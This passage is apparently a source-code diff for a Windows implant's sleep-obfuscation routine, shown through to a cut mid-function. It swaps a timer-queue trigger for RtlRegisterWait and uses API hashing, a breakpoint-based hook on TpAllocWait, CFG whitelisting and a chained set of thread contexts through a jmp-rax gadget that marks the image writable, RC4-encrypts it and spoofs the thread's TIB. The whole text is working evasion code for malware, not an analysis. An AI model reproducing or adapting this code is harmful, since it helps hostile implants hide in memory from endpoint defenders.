@@ -14,7 +14,7 @@
 
 NTSTATUS
 NTAPI
-RtlCreateTimerQueue(
+RtlRegisterWaitQueue(
 	_In_ PHANDLE NewTimerQueue
 );
 
@@ -106,22 +106,21 @@ typedef struct
 	D_API( NtQueryVirtualMemory );
 	D_API( RtlInitUnicodeString );
 	D_API( RtlCopyMappedMemory );
-	D_API( RtlCreateTimerQueue );
-	D_API( RtlDeleteTimerQueue );
 	D_API( NtGetContextThread );
 	D_API( NtSetContextThread );
+	D_API( RtlDeregisterWait );
 	D_API( SystemFunction032 );
 	D_API( RtlCaptureContext );
 	D_API( RtlInitAnsiString );
 	D_API( NtDuplicateObject );
 	D_API( NtCreateThreadEx );
 	D_API( CreateThreadpool );
+	D_API( RtlRegisterWait );
 	D_API( NtSuspendThread );
 	D_API( NtGetNextThread );
 	D_API( CloseThreadpool );
 	D_API( RtlAllocateHeap );
 	D_API( VirtualProtect );
-	D_API( RtlCreateTimer );
 	D_API( NtResumeThread );
 	D_API( NtCreateEvent );
 	D_API( LdrUnloadDll );
@@ -143,19 +142,18 @@ typedef struct
 #define H_API_NTQUERYVIRTUALMEMORY		0x10c0e85d /* NtQueryVirtualMemory */
 #define H_API_RTLINITUNICODESTRING		0xef52b589 /* RtlInitUnicodeString */
 #define H_API_RTLCOPYMAPPEDMEMORY		0x5b56b302 /* RtlCopyMappedMemory */
-#define H_API_RTLCREATETIMERQUEUE		0x50ef3c31 /* RtlCreateTimerQueue */
-#define H_API_RTLDELETETIMERQUEUE		0xeec188b0 /* RtlDeleteTimerQueue */
 #define H_API_WAITFORSINGLEOBJECT		0x0df1b3da /* WaitForSingleObject */
 #define H_API_NTGETCONTEXTTHREAD		0x6d22f884 /* NtGetContextThread */
 #define H_API_NTSETCONTEXTTHREAD		0xffa0bf10 /* NtSetContextThread */
+#define H_API_RTLDEREGISTERWAIT			0x961776da /* RtlDeregisterWait */
 #define H_API_RTLCAPTURECONTEXT			0xeba8d910 /* RtlCaptureContext */
 #define H_API_RTLINITANSISTRING			0xa0c8436d /* RtlInitAnsiString */
 #define H_API_NTDUPLICATEOBJECT			0x4441d859 /* NtDuplicateObject */
 #define H_API_NTCREATETHREADEX			0xaf18cfb0 /* NtCreateThreadEx */
+#define H_API_RTLREGISTERWAIT			0x600fe691 /* RtlRegisterWait */
 #define H_API_NTSUSPENDTHREAD			0xe43d93e1 /* NtSuspendThread */
 #define H_API_NTGETNEXTTHREAD			0xa410fb9e /* NtGetNextThread */
 #define H_API_RTLALLOCATEHEAP			0x3be94c5a /* RtlAllocateHeap */
-#define H_API_RTLCREATETIMER			0x1877faec /* RtlCreateTimer */
 #define H_API_NTRESUMETHREAD			0x5a4bc3d0 /* NtResumeThread */
 #define H_API_NTCREATEEVENT			0x28d3233d /* NtCreateEvent */
 #define H_API_LDRUNLOADDLL			0xd995c1e6 /* LdrUnloadDll */
@@ -171,7 +169,7 @@ typedef struct
 #define H_LIB_NTDLL				0x1edab0ed /* ntdll.dll */
 
 /* STR Hashes */
-#define H_STR_TPALLOCTIMER			0x383d6995 /* TpAllocTimer */
+#define H_STR_TPALLOCWAIT			0x3fc54f89 /* TpAllocWait */
 #define H_STR_TEXT				0x0b6ea858 /* .text */
 
 /*!
@@ -489,12 +487,12 @@ static D_SEC( E ) VOID RemoveBreakpoint( _In_ PVOID Addr )
  *
  * Purpose:
  *
- * Modifies TpAllocTimer to use a custom thread pool. Inteded to
- * act as a hook for the call RtlCreateTimer and redirected to
+ * Modifies TpAllocWait to use a custom thread pool. Inteded to
+ * act as a hook for the call RtlRegisterWait and redirected to
  * with a VEH debugger.
  *
 !*/
-static D_SEC( E ) NTSTATUS NTAPI TpAllocTimerHook( _Out_ PTP_TIMER *Timer, _In_ PTP_TIMER_CALLBACK Callback, _Inout_opt_ PVOID Context, _In_opt_ PTP_CALLBACK_ENVIRON CallbackEnviron ) 
+static D_SEC( E ) NTSTATUS NTAPI TpAllocWaitHook( _Out_ PTP_WAIT **Out, _In_ PTP_WAIT_CALLBACK Callback, _Inout_opt_ PVOID Context, _In_opt_ PTP_CALLBACK_ENVIRON CallbackEnviron ) 
 {
 	PTABLE		Tbl = NULL;
 	NTSTATUS 	Ret = STATUS_SUCCESS;
@@ -503,16 +501,16 @@ static D_SEC( E ) NTSTATUS NTAPI TpAllocTimerHook( _Out_ PTP_TIMER *Timer, _In_ 
 	Tbl = C_PTR( G_SYM( Table ) );
 
 	/* Remove a breakpoint on the ntdll!TpAllocTimer  */
-	RemoveBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );
+	RemoveBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCWAIT ) ) );
 
 	/* Execute TpAllocTimer and swap CallbackEnviron with a replacement */
-	Ret = ( ( __typeof__( TpAllocTimerHook ) * ) PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) )(
-		Timer, Callback, Context, & Tbl->Table->Debugger.PoolEnv
+	Ret = ( ( __typeof__( TpAllocWaitHook ) * ) PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCWAIT ) )(
+		Out, Callback, Context, & Tbl->Table->Debugger.PoolEnv
 
 	);
 
 	/* Enables a breakpoint on the ntdll!TpAllocTimer */
-	EnableBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );
+	EnableBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCWAIT ) ) );
 
 	/* Return */
 	return Ret;
@@ -537,9 +535,9 @@ static D_SEC( E ) LONG WINAPI VehDebugger( _In_ PEXCEPTION_POINTERS ExceptionIf 
 	/* Is the thread where our debugger comes from ? */
 	if ( Tbl->Table->ClientId.UniqueThread == NtCurrentTeb()->ClientId.UniqueThread ) {
 		if ( ExceptionIf->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP ) {
-			if ( U_PTR( ExceptionIf->ExceptionRecord->ExceptionAddress ) == U_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) ) {
+			if ( U_PTR( ExceptionIf->ExceptionRecord->ExceptionAddress ) == U_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCWAIT ) ) ) {
 				/* Redirect TpAllocTimer -> TpAllocTimerHook */
-				ExceptionIf->ContextRecord->Rip = U_PTR( G_SYM( TpAllocTimerHook ) );
+				ExceptionIf->ContextRecord->Rip = U_PTR( G_SYM( TpAllocWaitHook ) );
 			};
 			/* Notify! */
 			Ret = EXCEPTION_CONTINUE_EXECUTION;
@@ -628,11 +626,11 @@ static D_SEC( E ) VOID WINAPI ObfSleepFiber( _In_ PFIBER_PARAM Parameter )
 	PVOID			Ev1 = NULL;
 	PVOID			Ev2 = NULL;
 	PVOID			Ev3 = NULL;
+	PVOID			Ev4 = NULL;
 	PVOID			K32 = NULL;
 	PVOID			Adv = NULL;
-	PVOID			Tmr = NULL;
-	PVOID			Que = NULL;
 	PVOID			Img = NULL;
+	PVOID			Que = NULL;
 
 	PVOID			Cln = NULL;
 	PVOID			Pol = NULL;
@@ -675,17 +673,16 @@ static D_SEC( E ) VOID WINAPI ObfSleepFiber( _In_ PFIBER_PARAM Parameter )
 	Api.NtWaitForSingleObject             = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
 	Api.RtlInitUnicodeString              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING ); 
 	Api.RtlCopyMappedMemory               = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCOPYMAPPEDMEMORY );
-	Api.RtlCreateTimerQueue               = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCREATETIMERQUEUE );
-	Api.RtlDeleteTimerQueue               = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLDELETETIMERQUEUE );
 	Api.NtGetContextThread                = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETCONTEXTTHREAD );
 	Api.NtSetContextThread                = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETCONTEXTTHREAD );
+	Api.RtlDeregisterWait                 = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLDEREGISTERWAIT );
 	Api.RtlCaptureContext                 = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCAPTURECONTEXT );
 	Api.RtlInitAnsiString                 = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITANSISTRING );
 	Api.NtDuplicateObject                 = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTDUPLICATEOBJECT );
+	Api.RtlRegisterWait                   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLREGISTERWAIT );
 	Api.NtGetNextThread                   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETNEXTTHREAD );
 	Api.RtlAllocateHeap                   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
 	Api.NtResumeThread                    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTRESUMETHREAD );
-	Api.RtlCreateTimer                    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCREATETIMER );
 	Api.NtCreateEvent                     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATEEVENT );
 	Api.LdrUnloadDll                      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
 	Api.RtlFreeHeap                       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
@@ -762,13 +759,16 @@ static D_SEC( E ) VOID WINAPI ObfSleepFiber( _In_ PFIBER_PARAM Parameter )
 					/* Abort! */
 					break;
 				};
-
+				/* Create synchronization event 4 */
+				if ( ! NT_SUCCESS( Api.NtCreateEvent( &Ev4, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) ) {
+					/* Abort! */
+					break;
+				};
 				/* Add an exception handler to handle hooking. */
 				if ( ! ( Veh = Api.RtlAddVectoredExceptionHandler( 1, C_PTR( G_SYM( VehDebugger ) ) ) ) ) {
 					/* Abort! */
 					break;
 				};
-
 				/* Initialize the thread pool environment */
 				InitializeThreadpoolEnvironment( &Tbl->Table->Debugger.PoolEnv );
 
@@ -796,260 +796,257 @@ static D_SEC( E ) VOID WINAPI ObfSleepFiber( _In_ PFIBER_PARAM Parameter )
 				SetThreadpoolCallbackCleanupGroup( & Tbl->Table->Debugger.PoolEnv, Cln, NULL );
 
 				/* Add breakpoint on ntdll!TpAllocTimer */
-				EnableBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );
+				EnableBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCWAIT ) ) );
 
-				/* Create the primary thread queue */
-				if ( NT_SUCCESS( Api.RtlCreateTimerQueue( &Que ) ) ) {
+				/* Flags to query for! */
+				Ctx.ContextFlags = CONTEXT_FULL;
 
-					Ctx.ContextFlags = CONTEXT_FULL;
+				/* Create the first time and spawn the new thread */
+				if ( NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.RtlCaptureContext, &Ctx, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) {
+					if ( NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.SetEvent, Ev1, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) {
+						if ( NT_SUCCESS( Api.NtWaitForSingleObject( Ev1, FALSE, NULL ) ) ) {
+							if ( !( Cap = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
+								/* Abort! */
+								break;
+							};
+							if ( !( Beg = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
+								/* Abort! */
+								break;
+							};
+							if ( !( Set = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
+								/* Abort! */
+								break;
+							};
+							if ( !( Enc = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
+								/* Abort! */
+								break;
+							};
+							if ( !( Gt1 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
+								/* Abort! */
+								break;
+							};
+							if ( !( Cp1 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
+								/* Abort! */
+								break;
+							};
+							if ( !( Cp2 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
+								/* Abort! */
+								break;
+							};
+							if ( !( St1 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
+								/* Abort! */
+								break;
+							};
+							if ( !( Sev = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
+								/* Abort! */
+								break;
+							};
+							if ( !( Blk = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
+								/* Abort! */
+								break;
+							};
+							if ( !( Cp3 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
+								/* Abort! */
+								break;
+							};
+							if ( !( St2 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
+								/* Abort! */
+								break;
+							};
+							if ( !( Dec = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) { 
+								/* Abort! */
+								break;
+							};
+							if ( !( Res = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
+								/* Abort! */
+								break;
+							};
+							if ( !( End = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
+								/* Abort! */
+								break;
+							};
 
-					/* Create the first time and spawn the new thread */
-					if ( NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.RtlCaptureContext, &Ctx, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
-						if ( NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.SetEvent, Ev1, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
-							if ( NT_SUCCESS( Api.NtWaitForSingleObject( Ev1, FALSE, NULL ) ) ) {
-								if ( !( Cap = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
-									/* Abort! */
-									break;
-								};
-								if ( !( Beg = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
-									/* Abort! */
-									break;
-								};
-								if ( !( Set = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
-									/* Abort! */
-									break;
-								};
-								if ( !( Enc = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
-									/* Abort! */
-									break;
-								};
-								if ( !( Gt1 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
-									/* Abort! */
-									break;
-								};
-								if ( !( Cp1 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
-									/* Abort! */
-									break;
-								};
-								if ( !( Cp2 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
-									/* Abort! */
-									break;
-								};
-								if ( !( St1 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
-									/* Abort! */
-									break;
-								};
-								if ( !( Sev = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
-									/* Abort! */
-									break;
-								};
-								if ( !( Blk = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
-									/* Abort! */
-									break;
-								};
-								if ( !( Cp3 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
-									/* Abort! */
-									break;
-								};
-								if ( !( St2 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
-									/* Abort! */
-									break;
-								};
-								if ( !( Dec = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) { 
-									/* Abort! */
-									break;
-								};
-								if ( !( Res = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
-									/* Abort! */
-									break;
-								};
-								if ( !( End = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
-									/* Abort! */
-									break;
-								};
+							/* Get the address of the jmp rax gadget */
+							if ( ( Gdg = GetJmpRaxTarget( ) ) != NULL ) { 
 
-								/* Get the address of the jmp rax gadget */
-								if ( ( Gdg = GetJmpRaxTarget( ) ) != NULL ) { 
+								/* Copy the old NT_TIB structure into a stack var */
+								__builtin_memcpy( &Oli, & NtCurrentTeb()->NtTib, sizeof( NT_TIB ) );
 
-									/* Copy the old NT_TIB structure into a stack var */
-									__builtin_memcpy( &Oli, & NtCurrentTeb()->NtTib, sizeof( NT_TIB ) );
+								/* Extract the NT_TIB structure from our thread pool thread */
+								if ( GetThreadInfoBlockFromStack( Ctx.Rsp, &Nwi ) ) {
+									/* Duplicate a handle to our current thread. */
+									if ( NT_SUCCESS( Api.NtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &Src, 0, 0, DUPLICATE_SAME_ACCESS ) ) ) {
 
-									/* Extract the NT_TIB structure from our thread pool thread */
-									if ( GetThreadInfoBlockFromStack( Ctx.Rsp, &Nwi ) ) {
-										/* Duplicate a handle to our current thread. */
-										if ( NT_SUCCESS( Api.NtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &Src, 0, 0, DUPLICATE_SAME_ACCESS ) ) ) {
+										/* Enable CFG on the target function in case its blacklisted */
+										CfgEnableFunc( PebGetModule( H_LIB_NTDLL ), Api.NtContinue );
+										CfgEnableFunc( PebGetModule( H_LIB_NTDLL ), Api.NtResumeThread );
+										CfgEnableFunc( PebGetModule( H_LIB_NTDLL ), Api.NtGetContextThread );
+										CfgEnableFunc( PebGetModule( H_LIB_NTDLL ), Api.NtSetContextThread );
+										CfgEnableFunc( PebGetModule( H_LIB_NTDLL ), Api.RtlCopyMappedMemory );
 
-											/* Enable CFG on the target function in case its blacklisted */
-											CfgEnableFunc( PebGetModule( H_LIB_NTDLL ), Api.NtContinue );
-											CfgEnableFunc( PebGetModule( H_LIB_NTDLL ), Api.NtResumeThread );
-											CfgEnableFunc( PebGetModule( H_LIB_NTDLL ), Api.NtGetContextThread );
-											CfgEnableFunc( PebGetModule( H_LIB_NTDLL ), Api.NtSetContextThread );
-											CfgEnableFunc( PebGetModule( H_LIB_NTDLL ), Api.RtlCopyMappedMemory );
+										/* WaitForSingleObjectEx */
+										__builtin_memcpy( Beg, &Ctx, sizeof( CONTEXT ) );
+										Beg->ContextFlags = CONTEXT_FULL;
+										Beg->Rip  = U_PTR( Gdg );
+										Beg->Rsp -= U_PTR( sizeof( PVOID ) );
+										Beg->Rax  = U_PTR( Api.WaitForSingleObjectEx );
+										Beg->Rcx  = U_PTR( Ev2 );
+										Beg->Rdx  = U_PTR( INFINITE );
+										Beg->R8   = U_PTR( FALSE );
 
-											/* WaitForSingleObjectEx */
-											__builtin_memcpy( Beg, &Ctx, sizeof( CONTEXT ) );
-											Beg->ContextFlags = CONTEXT_FULL;
-											Beg->Rip  = U_PTR( Gdg );
-											Beg->Rsp -= U_PTR( sizeof( PVOID ) );
-											Beg->Rax  = U_PTR( Api.WaitForSingleObjectEx );
-											Beg->Rcx  = U_PTR( Ev2 );
-											Beg->Rdx  = U_PTR( INFINITE );
-											Beg->R8   = U_PTR( FALSE );
+										/* VirtualProtect */
+										__builtin_memcpy( Set, &Ctx, sizeof( CONTEXT ) );
+										Set->ContextFlags = CONTEXT_FULL;
+										Set->Rip  = U_PTR( Gdg );
+										Set->Rsp -= U_PTR( sizeof( PVOID ) );
+										Set->Rax  = U_PTR( Api.VirtualProtect );
+										Set->Rcx  = U_PTR( Img );
+										Set->Rdx  = U_PTR( XLn );
+										Set->R8   = U_PTR( PAGE_READWRITE );
+										Set->R9   = U_PTR( &Prt );
 
-											/* VirtualProtect */
-											__builtin_memcpy( Set, &Ctx, sizeof( CONTEXT ) );
-											Set->ContextFlags = CONTEXT_FULL;
-											Set->Rip  = U_PTR( Gdg );
-											Set->Rsp -= U_PTR( sizeof( PVOID ) );
-											Set->Rax  = U_PTR( Api.VirtualProtect );
-											Set->Rcx  = U_PTR( Img );
-											Set->Rdx  = U_PTR( XLn );
-											Set->R8   = U_PTR( PAGE_READWRITE );
-											Set->R9   = U_PTR( &Prt );
+										/* SystemFunction032 */
+										__builtin_memcpy( Enc, &Ctx, sizeof( CONTEXT ) );
+										Enc->ContextFlags = CONTEXT_FULL;
+										Enc->Rip  = U_PTR( Gdg );
+										Enc->Rsp -= U_PTR( sizeof( PVOID ) );
+										Enc->Rax  = U_PTR( Api.SystemFunction032 );
+										Enc->Rcx  = U_PTR( &Buf );
+										Enc->Rdx  = U_PTR( &Key );
 
-											/* SystemFunction032 */
-											__builtin_memcpy( Enc, &Ctx, sizeof( CONTEXT ) );
-											Enc->ContextFlags = CONTEXT_FULL;
-											Enc->Rip  = U_PTR( Gdg );
-											Enc->Rsp -= U_PTR( sizeof( PVOID ) );
-											Enc->Rax  = U_PTR( Api.SystemFunction032 );
-											Enc->Rcx  = U_PTR( &Buf );
-											Enc->Rdx  = U_PTR( &Key );
+										/* NtGetContextThread */
+										__builtin_memcpy( Gt1, &Ctx, sizeof( CONTEXT ) );
+										Gt1->ContextFlags = CONTEXT_FULL;
+										Cap->ContextFlags = CONTEXT_FULL;
+										Gt1->Rip  = U_PTR( Gdg );
+										Gt1->Rsp -= U_PTR( sizeof( PVOID ) );
+										Gt1->Rax  = U_PTR( Api.NtGetContextThread );
+										Gt1->Rcx  = U_PTR( Src );
+										Gt1->Rdx  = U_PTR( Cap );
 
-											/* NtGetContextThread */
-											__builtin_memcpy( Gt1, &Ctx, sizeof( CONTEXT ) );
-											Gt1->ContextFlags = CONTEXT_FULL;
-											Cap->ContextFlags = CONTEXT_FULL;
-											Gt1->Rip  = U_PTR( Gdg );
-											Gt1->Rsp -= U_PTR( sizeof( PVOID ) );
-											Gt1->Rax  = U_PTR( Api.NtGetContextThread );
-											Gt1->Rcx  = U_PTR( Src );
-											Gt1->Rdx  = U_PTR( Cap );
+										/* RtlCopyMappedMemory */
+										__builtin_memcpy( Cp1, &Ctx, sizeof( CONTEXT ) );
+										Cp1->ContextFlags = CONTEXT_FULL;
+										Cp1->Rip  = U_PTR( Gdg );
+										Cp1->Rsp -= U_PTR( sizeof( PVOID ) );
+										Cp1->Rip  = U_PTR( Api.RtlCopyMappedMemory );
+										Cp1->Rcx  = U_PTR( & Ctx.Rip );
+										Cp1->Rdx  = U_PTR( & Cap->Rip );
+										Cp1->R8   = U_PTR( sizeof( PVOID ) );
 
-											/* RtlCopyMappedMemory */
-											__builtin_memcpy( Cp1, &Ctx, sizeof( CONTEXT ) );
-											Cp1->ContextFlags = CONTEXT_FULL;
-											Cp1->Rip  = U_PTR( Gdg );
-											Cp1->Rsp -= U_PTR( sizeof( PVOID ) );
-											Cp1->Rip  = U_PTR( Api.RtlCopyMappedMemory );
-											Cp1->Rcx  = U_PTR( & Ctx.Rip );
-											Cp1->Rdx  = U_PTR( & Cap->Rip );
-											Cp1->R8   = U_PTR( sizeof( PVOID ) );
+										/* RtlCopyMappedMemory */
+										__builtin_memcpy( Cp2, &Ctx, sizeof( CONTEXT ) );
+										Cp2->ContextFlags = CONTEXT_FULL;
+										Cp2->Rip  = U_PTR( Gdg );
+										Cp2->Rsp -= U_PTR( sizeof( PVOID ) );
+										Cp2->Rax  = U_PTR( Api.RtlCopyMappedMemory );
+										Cp2->Rcx  = U_PTR( & NtCurrentTeb()->NtTib );
+										Cp2->Rdx  = U_PTR( & Nwi );
+										Cp2->R8   = U_PTR( sizeof( NT_TIB ) );
 
-											/* RtlCopyMappedMemory */
-											__builtin_memcpy( Cp2, &Ctx, sizeof( CONTEXT ) );
-											Cp2->ContextFlags = CONTEXT_FULL;
-											Cp2->Rip  = U_PTR( Gdg );
-											Cp2->Rsp -= U_PTR( sizeof( PVOID ) );
-											Cp2->Rax  = U_PTR( Api.RtlCopyMappedMemory );
-											Cp2->Rcx  = U_PTR( & NtCurrentTeb()->NtTib );
-											Cp2->Rdx  = U_PTR( & Nwi );
-											Cp2->R8   = U_PTR( sizeof( NT_TIB ) );
+										/* NtSetContextThread */
+										__builtin_memcpy( St1, &Ctx, sizeof( CONTEXT ) );
+										St1->ContextFlags = CONTEXT_FULL;
+										St1->Rip  = U_PTR( Gdg );
+										St1->Rsp -= U_PTR( sizeof( PVOID ) );
+										St1->Rax  = U_PTR( Api.NtSetContextThread );
+										St1->Rcx  = U_PTR( Src );
+										St1->Rdx  = U_PTR( & Ctx );
 
-											/* NtSetContextThread */
-											__builtin_memcpy( St1, &Ctx, sizeof( CONTEXT ) );
-											St1->ContextFlags = CONTEXT_FULL;
-											St1->Rip  = U_PTR( Gdg );
-											St1->Rsp -= U_PTR( sizeof( PVOID ) );
-											St1->Rax  = U_PTR( Api.NtSetContextThread );
-											St1->Rcx  = U_PTR( Src );
-											St1->Rdx  = U_PTR( & Ctx );
+										/* NtResumeThread */
+										__builtin_memcpy( Sev, &Ctx, sizeof( CONTEXT ) );
+										Sev->ContextFlags = CONTEXT_FULL;
+										Sev->Rip  = U_PTR( Gdg );
+										Sev->Rsp -= U_PTR( sizeof( PVOID ) );
+										Sev->Rax  = U_PTR( Api.NtResumeThread );
+										Sev->Rcx  = U_PTR( Parameter->Thread );
+										Sev->Rdx  = U_PTR( NULL );
 
-											/* NtResumeThread */
-											__builtin_memcpy( Sev, &Ctx, sizeof( CONTEXT ) );
-											Sev->ContextFlags = CONTEXT_FULL;
-											Sev->Rip  = U_PTR( Gdg );
-											Sev->Rsp -= U_PTR( sizeof( PVOID ) );
-											Sev->Rax  = U_PTR( Api.NtResumeThread );
-											Sev->Rcx  = U_PTR( Parameter->Thread );
-											Sev->Rdx  = U_PTR( NULL );
+										/* WaitForSingleObjectEx */
+										__builtin_memcpy( Blk, &Ctx, sizeof( CONTEXT ) );
+										Blk->ContextFlags = CONTEXT_FULL;
+										Blk->Rip  = U_PTR( Gdg );
+										Blk->Rsp -= U_PTR( sizeof( PVOID ) );
+										Blk->Rax  = U_PTR( Api.WaitForSingleObjectEx );
+										Blk->Rcx  = U_PTR( Parameter->Thread );
+										Blk->Rdx  = U_PTR( INFINITE );
+										Blk->R8   = U_PTR( FALSE );
 
-											/* WaitForSingleObjectEx */
-											__builtin_memcpy( Blk, &Ctx, sizeof( CONTEXT ) );
-											Blk->ContextFlags = CONTEXT_FULL;
-											Blk->Rip  = U_PTR( Gdg );
-											Blk->Rsp -= U_PTR( sizeof( PVOID ) );
-											Blk->Rax  = U_PTR( Api.WaitForSingleObjectEx );
-											Blk->Rcx  = U_PTR( Parameter->Thread );
-											Blk->Rdx  = U_PTR( INFINITE );
-											Blk->R8   = U_PTR( FALSE );
+										/* RtlCopyMappedMemory */
+										__builtin_memcpy( Cp3, &Ctx, sizeof( CONTEXT ) );
+										Cp3->ContextFlags = CONTEXT_FULL;
+										Cp3->Rip  = U_PTR( Gdg );
+										Cp3->Rsp -= U_PTR( sizeof( PVOID ) );
+										Cp3->Rax  = U_PTR( Api.RtlCopyMappedMemory );
+										Cp3->Rcx  = U_PTR( & NtCurrentTeb()->NtTib );
+										Cp3->Rdx  = U_PTR( & Oli );
+										Cp3->R8   = U_PTR( sizeof( NT_TIB ) );
 
-											/* RtlCopyMappedMemory */
